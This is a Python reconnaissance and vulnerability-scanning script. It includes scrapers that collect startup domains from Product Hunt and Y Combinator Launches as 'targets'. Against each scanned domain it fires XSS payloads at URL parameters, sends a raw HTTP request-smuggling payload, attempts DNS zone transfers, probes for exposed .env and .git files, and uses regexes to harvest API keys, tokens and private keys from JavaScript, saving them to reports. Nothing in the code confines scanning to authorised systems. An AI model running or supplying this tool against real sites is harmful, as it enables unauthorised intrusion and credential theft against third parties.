import requests
from bs4 import BeautifulSoup
import subprocess
import re
import socket
import time
import json
import threading
import hashlib
from urllib.parse import urljoin
from datetime import datetime, timezone
import dns.resolver
import dns.query
import dns.zone
from playwright.sync_api import sync_playwright
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


results_lock = threading.Lock()
all_domains = set()
xss_payloads = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

# ------------------ SOURCE SCRAPING ------------------

def fetch_producthunt_domains(playwright):
    print("[*] Scraping Product Hunt using Playwright...")
    domains = []
    blocked_domains = ["youtube.com", "x.com", "linkedin.com", "instagram.com", "facebook.com", "github.com", "google.com"]

    try:
        browser = playwright.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        page.goto("https://www.producthunt.com/", timeout=60000)
        print("[*] Loaded: https://www.producthunt.com/")
        page.wait_for_selector("a[href*='/posts/']")

        links = page.locator("a[href*='/posts/']").all()
        post_urls = set()

        for link in links:
            href = link.get_attribute("href")
            if href and "/posts/" in href:
                full_url = "https://www.producthunt.com" + href
                post_urls.add(full_url)

        for post in list(post_urls)[:50]:
            try:
                print(f"[>] Visiting post: {post}")
                page.goto(post, timeout=30000)
                page.wait_for_timeout(2000)

                with context.expect_page() as new_page_info:
                    page.locator("button[data-sentry-component='VisitButton']").click()
                target_page = new_page_info.value
                target_page.wait_for_load_state("domcontentloaded", timeout=10000)
                final_url = target_page.url
                target_page.close()

                if final_url and final_url.startswith("http"):
                    domain = final_url.split("/")[2]
                    if any(bad in domain for bad in blocked_domains):
                        print(f"    [-] Skipped social domain: {domain}")
                    else:
                        print(f"    [+] Found target domain: {domain}")
                        domains.append("http://" + domain)
            except Exception as e:
                print(f"[!] Failed to process {post}: {e}")
                continue

        browser.close()
    except Exception as e:
        print(f"[!] Playwright error (Product Hunt): {e}")
    return list(set(domains))

def fetch_ycombinator_launches(playwright):
    print("[*] Scraping Y Combinator Launches using Playwright...")
    domains = []
    blocked_domains = ["youtube.com", "x.com", "linkedin.com", "instagram.com", "facebook.com", "startupschool.org", "youtu.be", "github.com"]

    try:
        browser = playwright.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto("https://www.ycombinator.com/launches", timeout=60000)
        page.wait_for_selector("a[href^='/launches/']")
        links = page.locator("a[href^='/launches/']").all()
        launch_urls = set()

        for link in links:
            href = link.get_attribute("href")
            if href and href.startswith("/launches/"):
                full_url = "https://www.ycombinator.com" + href
                launch_urls.add(full_url)

        for launch_url in list(launch_urls)[:50]:
            try:
                print(f"[>] Visiting launch page: {launch_url}")
                page.goto(launch_url, timeout=30000)
                page.wait_for_timeout(2000)
                target_links = page.locator("a").all()
                for l in target_links:
                    href = l.get_attribute("href")
                    if href and href.startswith("http"):
                        if any(domain in href for domain in blocked_domains):
                            print(f"    [-] Skipped social link: {href}")
                        elif "ycombinator.com" not in href:
                            print(f"    [+] Found external link: {href}")
                            domains.append(href)
            except Exception as e:
                print(f"[!] Failed to scrape {launch_url}: {e}")
                continue

        browser.close()
    except Exception as e:
        print(f"[!] Playwright error (Y Combinator): {e}")
    return list(set(domains))

def threaded_scraper(scrape_func, label):
    try:
        with sync_playwright() as p:
            domains = scrape_func(p)
            with results_lock:
                all_domains.update(domains)
            print(f"[✓] Finished {label} scraper with {len(domains)} domains.")
    except Exception as e:
        print(f"[!] Error in {label} scraper: {e}")



def scrape_sources_concurrently():
    threads = []

    def run_producthunt(p):
        return fetch_producthunt_domains(p)

    def run_ycombinator(p):
        return fetch_ycombinator_launches(p)

    tasks = [
        ("Product Hunt", run_producthunt),
        ("Y Combinator", run_ycombinator)
    ]

    for label, func in tasks:
        t = threading.Thread(target=threaded_scraper, args=(func, label))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return list(all_domains)



# ------------------ DNS / TECH / EXPOSURE ------------------

def clean_domain(url):
    return url.replace("https://", "").replace("http://", "").split("/")[0]

def resolve_cname(domain):
    try:
        result = subprocess.check_output(['dig', '+short', domain, 'CNAME'], text=True).strip()
        return result if result else None
    except:
        return None

def resolve_ip(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

def check_for_takeover(cname):
    vulnerable_services = [
        'herokuapp.com', 'github.io', 's3.amazonaws.com', 'amazonaws.com',
        'bitbucket.io', 'shopify.com', 'fastly.net', 'readthedocs.io',
        'wpengine.com', 'unbouncepages.com', 'azurewebsites.net',
        'pantheonsite.io', 'zendesk.com', 'surge.sh', 'netlify.app'
    ]
    return any(service in cname for service in vulnerable_services)

def enumerate_subdomains(domain):
    subdomains = []
    common = ["www", "dev", "test", "stage", "admin", "api", "beta", "blog"]
    for sub in common:
        full = f"{sub}.{domain}"
        try:
            socket.gethostbyname(full)
            subdomains.append(full)
        except:
            continue
    return subdomains

def check_exposed_files(domain):
    paths = [".git/config", ".env", ".DS_Store", "backup.zip"]
    exposed = []
    for path in paths:
        try:
            url = f"http://{domain}/{path}"
            res = requests.get(url, timeout=5)
            if res.status_code == 200 and "root" in res.text.lower():
                exposed.append(path)
        except:
            continue
    return exposed

def detect_waf(domain):
    try:
        headers = requests.get(f"http://{domain}", timeout=5).headers
        waf_indicators = ["cloudflare", "sucuri", "akamai", "imperva", "360wz"]
        return any(waf in str(headers).lower() for waf in waf_indicators)
    except:
        return False

def favicon_hash(domain):
    try:
        res = requests.get(f"http://{domain}/favicon.ico", timeout=5)
        if res.status_code == 200:
            return hashlib.md5(res.content).hexdigest()
    except:
        pass
    return None

def detect_tech(domain):
    techs = []
    try:
        res = requests.get(f"http://{domain}", timeout=8)
        text = res.text.lower()
        headers = res.headers
        cookies = res.cookies.get_dict()

        # === CMS ===
        if "wp-content" in text or "wp-json" in text:
            techs.append("WordPress")
        if "wp-admin" in text:
            techs.append("WordPress Admin")
        if "drupal-settings-json" in text or "x-drupal-cache" in headers:
            techs.append("Drupal")
        if "joomla" in text:
            techs.append("Joomla")
        if "ghost.css" in text or "/ghost/" in text:
            techs.append("Ghost CMS")
        if "shopify" in text or "x-shopify-stage" in headers:
            techs.append("Shopify")
        if "magento" in text or "mage-" in text:
            techs.append("Magento")
        if "squarespace" in text or "static.squarespace.com" in text:
            techs.append("Squarespace")
        if "wix.com" in text or "x-wix-request-id" in headers:
            techs.append("WIX")
        if "webflow" in text:
            techs.append("Webflow")

        # === Frameworks ===
        if "laravel" in text or "laravel_session" in cookies:
            techs.append("Laravel")
        if "symfony" in text or "x-debug-token" in headers:
            techs.append("Symfony")
        if "ci_session" in headers.get("Set-Cookie", ""):
            techs.append("CodeIgniter")
        if "flask" in text or "session" in cookies and ".flask" in cookies.get("session", ""):
            techs.append("Flask")
        if "django" in text or "csrftoken" in cookies:
            techs.append("Django")

        # === Front-End Frameworks ===
        if "react" in text or "__react" in text:
            techs.append("React")
        if "angular" in text or "ng-version" in text:
            techs.append("Angular")
        if "vue" in text or "__vue__" in text:
            techs.append("Vue.js")
        if "nextjs" in text or "next.js" in text or "_next" in text:
            techs.append("Next.js")

        # === Others ===
        if "server-timing" in headers and "vercel" in headers.get("server", "").lower():
            techs.append("Vercel")
        if "cloudflare" in headers.get("server", "").lower():
            techs.append("Cloudflare")
        if "akamai" in headers.get("server", "").lower():
            techs.append("Akamai Edge")

    except Exception as e:
        techs.append(f"Error: {str(e).splitlines()[0]}")
    return list(set(techs))


def check_csp_headers(domain):
    result = {
        "has_csp": False,
        "has_x_frame_options": False,
        "csp_header": "",
        "x_frame_options": ""
    }
    try:
        res = requests.get(f"http://{domain}", timeout=5)
        headers = res.headers

        csp = headers.get("Content-Security-Policy", "")
        xfo = headers.get("X-Frame-Options", "")

        if csp:
            result["has_csp"] = True
            result["csp_header"] = csp

        if xfo:
            result["has_x_frame_options"] = True
            result["x_frame_options"] = xfo

    except:
        pass

    return result

def test_smuggling(domain):
    result = {
        "vulnerable": False,
        "notes": ""
    }
    try:
        host = domain
        port = 80
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 4\r\n"
            "\r\n"
            "GARB"
            "GET /smuggle-test HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "\r\n"
        )

        with socket.create_connection((host, port), timeout=4) as s:
            s.sendall(payload.encode())
            s.settimeout(2)
            response = s.recv(4096).decode(errors="ignore")
            if "smuggle" in response or "HTTP/1.1 200 OK" in response:
                result["vulnerable"] = True
                result["notes"] = response.splitlines()[0]  # First line of response

    except Exception as e:
        result["notes"] = f"Error: {str(e).splitlines()[0]}"
    return result

def test_reflected_xss(domain):
    findings = []
    try:
        res = requests.get(f"http://{domain}", timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        anchors = soup.find_all("a", href=True)

        for a in anchors:
            href = a['href']
            if "?" not in href or "=" not in href:
                continue
            full_url = urljoin(f"http://{domain}", href)
            parsed = urlparse(full_url)
            qs = parse_qs(parsed.query)

            for key in qs:
                for payload in xss_payloads:
                    new_qs = {k: (payload if k == key else v[0]) for k, v in qs.items()}
                    new_query = urlencode(new_qs)
                    test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
                    
                    try:
                        r = requests.get(test_url, timeout=6)
                        if payload in r.text:
                            findings.append({
                                "url": test_url,
                                "param": key,
                                "payload": payload
                            })
                            break
                    except:
                        continue
    except:
        pass
    return findings

def check_zone_transfer(domain):
    try:
        ns_records = dns.resolver.resolve(domain, 'NS')
        vulnerable_ns = []

        for ns in ns_records:
            ns_addr = str(ns.target).rstrip(".")
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns_addr, domain, timeout=5))
                if zone:
                    vulnerable_ns.append(ns_addr)
            except Exception:
                continue

        return vulnerable_ns
    except Exception:
        return []


# ------------------ JS SECRETS ------------------

def extract_js_links(base_url):
    try:
        res = requests.get(base_url, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        return [urljoin(base_url, script['src']) for script in soup.find_all('script', src=True)]
    except:
        return []

def scan_js_for_secrets(js_url):
    findings = []
    try:
        res = requests.get(js_url, timeout=10)
        content = res.text

        patterns = {
            # --- Secrets (already in your code) ---
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'(?i)aws(.{0,20})?["\']([0-9a-zA-Z/+]{40})["\']',
            'Google API Key': r'AIza[0-9A-Za-z-_]{35}',
            'Firebase URL': r'https://[a-z0-9-]+\.firebaseio\.com',
            'Heroku API Key': r'(?i)heroku(.{0,20})?["\']([0-9a-f]{32})["\']',
            'Mailgun API Key': r'key-[0-9a-zA-Z]{32}',
            'SendGrid API Key': r'SG\.[\w\d_-]{22,66}',
            'Stripe Live Key': r'sk_live_[0-9a-zA-Z]{16,64}',
            'Stripe Publishable Key': r'pk_live_[0-9a-zA-Z]{16,64}',
            'Slack Token': r'xox[baprs]-[0-9a-zA-Z]{10,48}',
            'Discord Webhook': r'https://discord(app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+',
            'Facebook Access Token': r'EAACEdEose0cBA[0-9A-Za-z]+',
            'Twitter API Key': r'(?i)twitter(.{0,20})?["\']([0-9a-zA-Z]{25,35})["\']',
            'PayPal Client ID': r'A[0-9A-Z]{31,60}',
            'JWT Token': r'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+',
            'Bearer Token': r'Bearer\s+[A-Za-z0-9\-_.=]{20,}',
            'Basic Auth Header': r'Authorization:\s*Basic\s+[A-Za-z0-9=:+/]{10,}',
            'Private Key': r'-----BEGIN PRIVATE KEY-----[\s\S]+?-----END PRIVATE KEY-----',
            'SSH Private Key': r'-----BEGIN OPENSSH PRIVATE KEY-----[\s\S]+?-----END OPENSSH PRIVATE KEY-----',
            'PGP Private Key': r'-----BEGIN PGP PRIVATE KEY BLOCK-----[\s\S]+?-----END PGP PRIVATE KEY BLOCK-----',
            'Username in JS': r'["\']username["\']\s*[:=]\s*["\'][^"\']{3,30}["\']',
            'Password in JS': r'["\']password["\']\s*[:=]\s*["\'][^"\']{6,30}["\']',
            'Basic Auth in URL': r'https?://[a-zA-Z0-9._%-]+:[^@]{1,40}@[a-zA-Z0-9.-]+',
            # Example fix for overly broad API key detection
            'Generic API Key': r'(?i)[\"\']?(api[_-]?key|secret|token)[\"\']?\s*[:=]\s*[\"\']([A-Za-z0-9_\-]{16,60})[\"\']'
,

            # --- URLs and IPs ---
            'URLs': r'https?://[^\s\'"<>]+',
            'Relative Links': r'["\'](/[^"\']+)["\']',
            'IPv4 Addresses': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
        }

        for name, pattern in patterns.items():
            matches = re.findall(pattern, content)
            if matches:
                flat_matches = []
                for match in matches:
                    if isinstance(match, tuple):
                        flat_matches.append(match[0])
                    else:
                        flat_matches.append(match)
                findings.append({
                    "js_url": js_url,
                    "type": name,
                    "samples": list(set(flat_matches))[:5]
                })

    except Exception as e:
        findings.append({
            "js_url": js_url,
            "type": "ScanError",
            "samples": [str(e)]
        })

    return findings


def check_open_redirect(domain):
    test_paths = [
        "/redirect?url=https://example.com",
        "/?url=https://example.com",
        "/?redirect=https://example.com",
        "/login?next=https://example.com",
        "/out?link=https://example.com",
        "/goto?url=https://example.com"
    ]

    vulnerable = []

    for path in test_paths:
        try:
            url = f"http://{domain}{path}"
            res = requests.get(url, timeout=6, allow_redirects=True)
            final_url = res.url
            parsed_final = urlparse(final_url)
            if parsed_final.netloc == "example.com":
                vulnerable.append(path)
        except Exception:
            continue

    return vulnerable



def detect_auth_leakage(domain):
    findings = []
    try:
        res = requests.get(f"http://{domain}", timeout=10)
        body = res.text.lower()

        auth_keywords = [
            "window.__auth__", "window.__user__", "window.__initial_state__",
            "auth_token", "access_token", "jwt", "sessionid", "csrftoken"
        ]
        for key in auth_keywords:
            if key in body:
                findings.append(key)
    except:
        pass
    return list(set(findings))

# ------------------ MAIN ------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Advanced Recon Tool")
    parser.add_argument("--src", required=True, help="Comma-separated list of domains (e.g. domain.com,www.test.com)")
    parser.add_argument("--out", default="recon_log", help="Base filename for output files (default: recon_log)")
    return parser.parse_args()



def run_full_recon(domains, out_base):
    seen = set()
    logs = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "domains": []
    }

    print(f"\n[*] Scanning {len(domains)} domains...\n")
    txt_report_lines = []

    for url in domains:
        domain = clean_domain(url)
        if domain in seen:
            continue
        seen.add(domain)

        print(f"\n[***] Running tests for: {domain} ***")

        entry = {
            "report_marker": f"=== START DOMAIN REPORT: {domain} ===",
            "domain": domain,
            "source_url": url,
            "cname": None,
            "ip": None,
            "status": None,
            "takeover_risk": False,
            "zone_transfer": False,
            "zone_transfer_ns": [],
            "secrets": [],
            "subdomains": [],
            "exposed_files": [],
            "waf_detected": False,
            "favicon_hash": None,
            "technologies": []
        }

        print(f"[>] Resolving CNAME/IP for {domain}")
        cname = resolve_cname(domain)
        ip = resolve_ip(domain)
        entry["cname"] = cname or "-"
        entry["ip"] = ip or "-"

        if cname and check_for_takeover(cname):
            entry["status"] = "TAKEOVER_POSSIBLE"
            entry["takeover_risk"] = True
        elif cname:
            entry["status"] = "CNAME_PRESENT"
        elif ip:
            entry["status"] = "RESOLVES"
        else:
            entry["status"] = "NO_DNS"
        print(f"{domain.ljust(35)} → {entry['status']}")
        print(f"[>] Enumerating subdomains")
        entry["subdomains"] = enumerate_subdomains(domain)

        print(f"[>] Checking exposed files")
        entry["exposed_files"] = check_exposed_files(domain)

        print(f"[>] Detecting WAF")
        entry["waf_detected"] = detect_waf(domain)

        print(f"[>] Getting favicon hash")
        entry["favicon_hash"] = favicon_hash(domain)

        print(f"[>] Detecting technologies")
        entry["technologies"] = detect_tech(domain)

        print(f"[>] Checking CSP and X-Frame headers")
        entry["csp_headers"] = check_csp_headers(domain)

        print(f"[>] Testing HTTP request smuggling")
        entry["smuggling_test"] = test_smuggling(domain)

        print(f"[>] Testing for open redirects")
        entry["open_redirects"] = check_open_redirect(domain)

        print(f"[>] Detecting auth leakage")
        entry["auth_leakage"] = detect_auth_leakage(domain)

        print(f"[>] Testing for reflected XSS")
        entry["xss_vulns"] = test_reflected_xss(domain)

        print(f"[>] Attempting zone transfer")
        zone_ns = check_zone_transfer(domain)
        if zone_ns:
            entry["zone_transfer"] = True
            entry["zone_transfer_ns"] = zone_ns

        print(f"[>] Extracting and scanning JS files for secrets")
        js_links = extract_js_links(f"http://{domain}")
        for js in js_links:
            secrets = scan_js_for_secrets(js)
            if secrets:
                entry["secrets"].extend(secrets)

        # Text Output Block
        txt_report_lines.append(f"\n=== DOMAIN REPORT: {domain} ===")
        txt_report_lines.append(f"Source URL     : {url}")
        txt_report_lines.append(f"IP Address     : {entry['ip']}")
        txt_report_lines.append(f"CNAME          : {entry['cname']}")
        txt_report_lines.append(f"Status         : {entry['status']}")
        txt_report_lines.append(f"Takeover Risk  : {entry['takeover_risk']}")
        txt_report_lines.append(f"Zone Transfer  : {entry['zone_transfer']}")
        if entry["zone_transfer_ns"]:
            txt_report_lines.append(f"  NS Records   : {', '.join(entry['zone_transfer_ns'])}")
        if entry["waf_detected"]:
            txt_report_lines.append("WAF Detected   : Yes")
        if entry["favicon_hash"]:
            txt_report_lines.append(f"Favicon Hash   : {entry['favicon_hash']}")
        if entry["technologies"]:
            txt_report_lines.append(f"Technologies   : {', '.join(entry['technologies'])}")
        if entry["subdomains"]:
            txt_report_lines.append(f"Subdomains     : {', '.join(entry['subdomains'])}")
        if entry["exposed_files"]:
            txt_report_lines.append(f"Exposed Files  : {', '.join(entry['exposed_files'])}")
        if entry["csp_headers"]["has_csp"]:
            txt_report_lines.append(f"CSP Header     : {entry['csp_headers']['csp_header']}")
        if entry["csp_headers"]["has_x_frame_options"]:
            txt_report_lines.append(f"X-Frame-Opts   : {entry['csp_headers']['x_frame_options']}")
        if entry["smuggling_test"]["vulnerable"]:
            txt_report_lines.append(f"HTTP Smuggling : VULNERABLE - {entry['smuggling_test']['notes']}")
        if entry["open_redirects"]:
            txt_report_lines.append("Open Redirects :")
            for r in entry["open_redirects"]:
                txt_report_lines.append(f"  - http://{domain}{r}")
        if entry["auth_leakage"]:
            txt_report_lines.append("Auth Leakage   :")
            for l in entry["auth_leakage"]:
                txt_report_lines.append(f"  - {l}")
        if entry["xss_vulns"]:
            txt_report_lines.append("XSS Vulns      :")
            for v in entry["xss_vulns"]:
                txt_report_lines.append(f"  - {v['url']} → param `{v['param']}`")
        if entry["secrets"]:
            txt_report_lines.append("Secrets Found  :")
            for s in entry["secrets"]:
                for sample in s["samples"]:
                    txt_report_lines.append(f"  - {s['type']} from {s['js_url']} → {sample}")
        txt_report_lines.append("=" * 60)

        logs["domains"].append(entry)
        
        time.sleep(1)

    # Save JSON
    json_filename = f"{out_base}_{datetime.now(timezone.utc).strftime('%Y%m%d')}.json"
    with open(json_filename, "w") as f:
        json.dump(logs, f, indent=2)
    print(f"\n[+] JSON log saved to: {json_filename}")

    # Save TXT
    txt_filename = f"{out_base}_{datetime.now(timezone.utc).strftime('%Y%m%d')}.txt"
    with open(txt_filename, "w") as f:
        f.write("\n".join(txt_report_lines))
    print(f"[+] Text summary saved to: {txt_filename}")

def main():
    args = parse_args()
    input_domains = [d.strip() for d in args.src.split(",") if d.strip()]
    if not input_domains:
        print("[!] No domains provided. Use --src to specify domains.")
        return
    run_full_recon(input_domains, args.out)

if __name__ == "__main__":
    main()
                    
